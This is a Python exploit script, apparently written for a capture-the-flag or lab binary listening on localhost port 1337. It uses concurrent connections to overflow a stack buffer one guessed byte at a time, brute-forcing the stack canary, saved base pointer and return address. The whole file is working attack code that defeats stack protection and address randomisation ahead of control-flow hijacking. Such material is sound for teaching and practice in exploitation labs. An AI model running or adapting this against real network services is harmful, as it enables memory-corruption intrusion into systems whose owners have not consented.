import asyncio, struct, time

initial_time = time.time()
BUFFER_OVERFLOW_OFFSET = 0x38 # offset at which buffer overflow occurs
HOST = "localhost"
PORT = 1337

class SuccessException(Exception):
	pass

def finished():
	finished_time = time.time()
	total = finished_time - initial_time
	print("Bruteforcing finished, time needed: %d s." % total)

try_order = [0] + [x for x in range(1, 256)][::-1]

def u64(data):
	return struct.unpack('<Q', data)[0]

async def try_char(prepend, char, semaphore):
	async with semaphore:
		reader, writer = await asyncio.open_connection(host=HOST, port=PORT)
		payload	= prepend
		payload += bytes([char])

		await reader.read(52)
		writer.write(payload)

		result = await reader.read(-1)

		writer.close()

		if result:
			exception = SuccessException()
			exception.char = char
			raise exception

async def start():
	semaphore = asyncio.BoundedSemaphore(20)

	prepend = b'A' * BUFFER_OVERFLOW_OFFSET
	for _ in range(16):
		print(prepend)
		futures = [asyncio.ensure_future(try_char(prepend, x, semaphore)) for x in try_order]
		done, pending = await asyncio.wait(futures, return_when=asyncio.FIRST_EXCEPTION)
		for pending_task in pending:
			pending_task.cancel()
		for done_task in done:
			try:
				done_task.result()
			except SuccessException as e:
				prepend += bytes([e.char])
				break

	prepend += bytes([0x62]) # 0x62 specific to the tested binary, can be b''
	for _ in range(7): # in case the above line is b'', change to range(8)
		print(prepend)
		futures = [asyncio.ensure_future(try_char(prepend, x, semaphore)) for x in try_order]
		done, pending = await asyncio.wait(futures, return_when=asyncio.FIRST_EXCEPTION)
		for pending_task in pending:
			pending_task.cancel()
		for done_task in done:
			try:
				done_task.result()
			except SuccessException as e:
				prepend += bytes([e.char])
				break

	canary = u64(prepend[BUFFER_OVERFLOW_OFFSET:BUFFER_OVERFLOW_OFFSET+8])
	ebp = u64(prepend[BUFFER_OVERFLOW_OFFSET+8:BUFFER_OVERFLOW_OFFSET+8+8])
	return_addr = u64(prepend[BUFFER_OVERFLOW_OFFSET+8+8:BUFFER_OVERFLOW_OFFSET+8+8+8])

	print('[*] Canary: 0x%x\n[*] EBP: 0x%x\n[*] ret_addr: 0x%x' % (canary, ebp, return_addr))
	finished()
	

loop = asyncio.get_event_loop()
loop.run_until_complete(start())
